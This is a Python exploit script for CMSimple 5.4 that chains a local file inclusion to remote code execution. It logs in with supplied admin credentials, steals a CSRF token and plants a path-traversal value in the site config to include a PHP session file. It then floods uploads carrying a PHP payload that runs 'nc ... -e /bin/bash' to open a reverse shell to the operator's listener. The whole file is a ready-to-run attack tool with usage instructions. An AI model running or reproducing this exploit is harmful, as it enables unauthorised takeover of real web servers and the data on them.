import requests
import concurrent.futures
import datetime
import sys
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import urllib3
import colorama
from colorama import Fore, Back, Style


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login():
    try:
        session = requests.Session()
        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        logdata = f"login=true&selected=Welcome_to_CMSimple_5&User={USER}&passwd={PASSWORD}&submit=Login"
        loginresp = session.post(RHOST, data=logdata, headers=headers, verify=False)

        if 'passwd' not in loginresp.cookies:
            print("[-] Login failed.")
            return

        print(f"[+] Logged in successfully as {USER}:{PASSWORD}")
        cookies = loginresp.cookies
        params = {'file': 'config', 'action': 'array'}
        config_response = session.get(RHOST, cookies=cookies, params=params, verify=False)
        soup = BeautifulSoup(config_response.text, 'lxml')
        csrf_token = soup.find('input', attrs={'name': 'csrf_token'})['value']
        print(f"[+] CSRF Token acquired: [ {csrf_token} ]")

        injected_path = ".." + "/.." * 30 + "/var/lib/php/sessions/sess_bytekiss"
        payload = f"csrf_token={csrf_token}&functions_file={injected_path}&form=array&file=config&action=save"
        save_response = session.post(RHOST, headers=headers, cookies=cookies, data=payload, verify=False)

        if save_response.status_code == 200:
            print(f"[+] LFI payload injected successfully.")
            print(f"[+] Set up your nc listener on port {LPORT}")
        else:
            print("[-] Injection may have failed.")

    except Exception as e:
        print(f"[!] Login or injection error: {e}")

def fuzz_upload():
    try:
        session_name = "bytekiss"
        cookies = {'PHPSESSID': session_name}
        payload = f"<?php passthru('nc {LHOST} {LPORT} -e /bin/bash'); ?>"
        files = {
            'PHP_SESSION_UPLOAD_PROGRESS': (None, payload),
            'file': ('dummy.txt', 'bytekiss' * 100, 'application/octet-stream')
        }
        response = requests.post(RHOST, files=files, cookies=cookies, verify=False)
    except Exception as e:
        print(f"[!] Upload error: {e}")


def main():
    print("\n[+] CMSimple (5.4) LFI to RCE Exploit")

    login()

    print(f"[+] Starting fuzz threads...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(fuzz_upload) for _ in range(20)]
        concurrent.futures.wait(futures)

    print("[+] Done Check your listener !")


if __name__ == "__main__":
    if len(sys.argv) < 6:
        print(Fore.RED + f"\n[-] Usage: {sys.argv[0]} <RHOST> <LHOST> <LPORT> <USER> <PASS>")
        print(f"[-] Example: {sys.argv[0]} https://target.com 192.168.1.15 1337 admin password")
        print(Fore.GREEN + "\n[+] Bytekiss RCE Tool --> Remake (Optimized)\n")
        Style.RESET_ALL
        sys.exit(1)

    RHOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USER = sys.argv[4]
    PASSWORD = sys.argv[5]
    main()
